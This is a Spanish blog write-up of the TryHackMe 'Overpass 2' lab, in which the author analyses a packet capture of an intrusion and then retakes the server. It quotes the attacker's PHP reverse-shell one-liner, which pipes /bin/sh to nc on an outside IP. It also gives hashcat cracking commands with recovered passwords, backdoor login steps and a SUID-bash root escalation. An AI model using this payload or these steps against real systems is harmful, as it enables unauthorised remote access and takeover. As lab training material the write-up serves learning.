---
layout: single
title: Máquina Overpass 2 (Hacked) - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Retomando nuevamente el pentesting, y siguiendo con el path Offensive Security de TryHackMe, hoy toca realizar la máquina Overpass 2 - Hacked. Esta máquina es guiada en el sentido de seguir instrucciones, pero no dice cómo hacerlo. Trataremos de darle solución."
date: 2022-07-08
classes: wide
header:
  teaser: /assets/images/overpass-2/portada.png
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - Wireshark
  - pcap
  - cracking
  - code analysis
  - backdoor
  - ssh
  - suid
  - bash
---

# Introducción
La máquina se encuentra en [TryHackMe](https://tryhackme.com/room/overpass2hacked). Es una máquina tipo desafío con instrucciones de qué hacer para ir resolviendo el problema, sin detallar en el cómo hacerlo. El planteamiento es muy bueno, se supone que somos una empresa de pentesting a quienes se les ha pedido investigar una brecha de seguridad donde un atacante logró acceder al servidor y comprometerlo. Nuestro objetivo es revisar los logs, analizar lo que hizo y volver a ganar acceso al sistema para recuperar las flags.

# Análisis de la captura
El sitio nos proporciona la captura de red que captó todo lo que el atacante realizó al momento de comprometer el servidor, por lo que es nuestra prioridad analizarla y ver cómo ganar acceso a este.

La primera pregunta de TryHackMe solicita saber cuál fue el directorio del sitio web que el atacante empleó para subir una reverse shell con la que ganó acceso inicial. Esto se responde filtrando la captura por paquetes **http** y analizando los endpoints que fueron visitados.

![1]

Resalta el nombre **payload**, el cual fue subido a un directorio llamado /development/, por lo cual esa es la respuesta a la primera pregunta. Para seguir analizando esa traza de datos, solo debemos hacer clic derecho -> Follow -> TCP Stream (o su equivalente en tu idioma).

![2]

Este nos mostrará más información del paquete, así como qué es lo que contenía, necesario para responder a las siguientes preguntas.

![3]

En la captura anterior se aprecia lo siguiente:
- El atacante visitó el sitio /development/upload.php (seguramente un file uploader sin protección)
- El atacante subió un archivo llamado payload.php, el cual es una reverse shell.
- Esta reverse shell contiene el siguiente código:

Código

    <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

Lo reconocemos a simple vista después de haber realizado las máquinas anteriores, es una reverse shell en un PHP. Esto responde a la pregunta número dos, que solicita el payload que el atacante usó para acceder al sistema.

Si nos dirigimos a la siguiente captura dentro del mismo stream de datos, veremos lo siguiente (para ello, en la parte inferior de la ventana veremos un par de flechas hacia arriba y hacia abajo, debemos hacer clic en la que va hacia arriba para ir a la siguiente):

![4]

En la captura anterior se observa lo siguiente:
- El atacante realizó un tratamiento de la TTY para tener un prompt más visual.
- El atacante realizó un cambio de usuario a **james** con la contraseña: *whenevernoteartinstant*
- Realizó una consulta por los permisos SUDO de dicho usuario con el comando *sudo -l*, observando que este usuario podía realizar *sudo* sin proporcionar contraseña (un error garrafal de seguridad).
- Al tener estos permisos, listo el archivo shadow, el cual recordemos, contiene los hashes de las contraseñas de acceso en Linux.

Esto responde a la pregunta tres, la cual solicita la contraseña que el atacante usó para cambiar de usuario: *whenevernoteartinstant*

Bajando en la misma captura, veremos lo siguiente:

![5]

Se trata del arhivo *shadow* el cual contiene los hashes de cinco usuarios. Además, vemos que el atacante hizo una descarga de un repositorio de GitHub llamado **SSH Backdoor**. Este último permite crear persistencia en el sistema al crear un puerto de acceso nuevo desde el cual el atacante podrá entrar cada que lo requiera, sin necesidad de comprometer nuevamente el servidor.

Esto responde a la pregunta cuatro, la cual requiere saber el nombre del programa con el cual el atacante creó persistencia en el sistema: https://github.com/NinjaJc01/ssh-backdoor

Por último, TryHackMe nos pide saber cuántas de esas cinco contraseñas hasheadas son crackeables, es decir, se pueden descifrar por medio de un ataque de fuerza bruta. Para ello, nos pide emplear el diccionario [fasttrack.txt](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt)

Este procedimiento lo podemos realizar por medio de **hashcat**, simplemente dándole el tipo de hash del que se trata (1800 - SHA512 Unix), el listado de hashes y el diccionario proporcionado:

    hashcat.exe -m 1800 -a 0 hashes/shadow.txt Wordlist/fasttrack.txt

Recordemos que el -a le indica al programa que el ataque es de fuerza bruta por diccionario. Si ejecutamos el comando tal cual, es probable que no nos proporcione una salida, indicándonos que dichas credenciales ya se encuentran en el **potfile** de hashcat (es decir, ya sabe de cuáles se tratan sin necesidad de realizar el ataque). Para visualizarlas, añadimos la bandera **--show** al final del comando.

![6]

Esta salida nos devuelve cuatro contraseñas, por lo que la respuesta para la pregunta cinco, cuántas contraseñas del sistema son crackeables, es 4.

# Analizando el código fuente
El siguiente apartado nos pide analizar el código fuente del programa que el atacante empleó para lograr persistencia en el sistema [SSH Backdoor](https://github.com/NinjaJc01/ssh-backdoor), por lo que abrimos el repositorio de dicho proyecto.

![7]

La primera pregunta nos pide saber el hash por defecto que emplea el programa, y este se encuentra dentro de su código fuente en la línea 19 del archivo **main.go**.

    bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

Se trata de un hash que emplea el programa por defecto para crear una contraseña de acceso al backdoor, la cual puede modificarse si queremos una contraseña personalizada. Eso responde a la pregunta uno.

La siguiente pregunta quiere saber el **salt** hardcodeado por defecto que emplea el programa para encriptar la clave (ver temas de Criptografía si no se sabe aún lo que es el salt)

![8]

Este se encuentra en la penúltima línea de código del mismo script, donde se manda llamar a una función llamada **verifyPass**, la cual recibe como segundo argumento el salt, el cual está hardcodeado en la llamada a la función.

    1c362db832f3f864c8c2fe05f2002a05

Esto responde a la pregunta dos.

La tercera pregunta solicita saber el hash que empleó el atacante para la contraseña que emplearía para acceder al backdoor. Para responderla, debemos regresar a la captura de red, exactamente donde nos quedamos la última vez. Veremos que el atacante descargo el backdoor y lo configuró.

![9]

En la captura anterior vemos el hash que empleó al momento de mandar llamar al binario y la respuesta que este le dió:

    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Este hash es la respuesta a la pregunta 3. Ahora, para la pregunta final nos piden crackear dicho hash para obtener la contraseña del atacante. Para ello, primero detectamos el tipo de hash de que se trata: SHA-512. Con esto en mente, para crackearlo por medio de **hashcat** necesitamos el salt, y dado que el usuario no proporcionó uno, se supone que el programa empleó el que lleva hardcodeado por defecto (pregunta dos).

Por ello, el hash completo a descifrar sería el siguiente:

    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

Mandamos llamar a hashcat de la siguiente manera:

    hashcat.exe -m 1710 -a 0 hashes/hash.txt Wordlist/rockyou.txt

Donde el modo a emplear ahora será el 1710, es decir, sha512 con salt. Nótese cómo ahora empleamos el diccionario **rockyou.txt** de acuerdo a las instrucciones de la plataforma. El programa nos devolverá lo siguiente:

![10]

Nuevamente parece que la contraseña ya se encuentra en el **potfile**, por lo que añadimos la bandera **--show** para visualizarla:

    november16

# Reconocimiento
Ya con toda esta información, podemos iniciar con la recuperación del acceso al servidor. Para ello, iniciamos con una enumeración como de costumbre. Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -p- --open -T5 -Pn -n 10.10.52.168

![11]

Vemos que hay tres puertos habilitados, el SSH (22), el HTTP (80) y el 2222.

Si realizamos un escaneo exhaustivo en busca de más información sobre estos puertos, la consulta no nos devolverá mayor información relevante:

    nmap -sC -sV -p22,80,2222 10.10.52.168

Este escaneo nos dice que el puerto desconocido, 2222, en realidad pertenece a un servicio SSH. Si volvemos a revisar la captura de red, veremos que al momento de correr el backdoor, este se pone a la escucha en el puerto 2222, por lo cual es por donde tendremos que acceder.

![13]

# Servicio HTTP
La primera pregunta que nos hace TryHackMe es saber el mensaje que el atacante ha dejado en el servicio web, así que lo visitamos:

![12]

Vemos que el mensaje es:

     H4ck3d by CooctusClan
    
Por lo tanto, respondemos a la pregunta y podemos prosegur con el acceso.

# Acceso al sistema por SSH Backdoor
Para poder acceder a este backdoor, basta con conectarse por medio de ssh al puerto sin necesidad de proporcionar usuario alguno, solo la contraseña:

    ssh 10.10.52.168 -p 2222

Cuando nos solicite la contraseña, la proporcionamos: *november16*.

![14]

Como podemos observar, hemos logrado acceder al sistema con las credenciales adquiridas del atacante. Entramos como el usuario **james**, así que primero enumeramos su direcctorio en busca de la primera flag: **user.txt**.

![15]

# Privilege Escalation
Hay algo extraño en el directorio del usuario, sin ahondar más en la enumeración, vemos que hay un binario SUID llamado:

    .suid_bash

![16]

¿Se trata a caso de un binario SUID dejado por el atacante con el objetivo de escalar a root rápidamente? Lo ponemos a prueba colocando el comando:

    bash -p

Y efectivamente, vemos que inmediatamente nos convertimos en usuario **root** sin mayor complicación, logrando recuperar la flag de dicho usuario y habiendo recuperado el acceso por completo al servidor.

![17]

[1]:/assets/images/overpass-2/1.png
[2]:/assets/images/overpass-2/2.png
[3]:/assets/images/overpass-2/3.png
[4]:/assets/images/overpass-2/4.png
[5]:/assets/images/overpass-2/5.png
[6]:/assets/images/overpass-2/6.png
[7]:/assets/images/overpass-2/7.png
[8]:/assets/images/overpass-2/8.png
[9]:/assets/images/overpass-2/9.png
[10]:/assets/images/overpass-2/10.png
[11]:/assets/images/overpass-2/11.png
[12]:/assets/images/overpass-2/12.png
[13]:/assets/images/overpass-2/13.png
[14]:/assets/images/overpass-2/14.png
[15]:/assets/images/overpass-2/15.png
[16]:/assets/images/overpass-2/16.png
[17]:/assets/images/overpass-2/17.png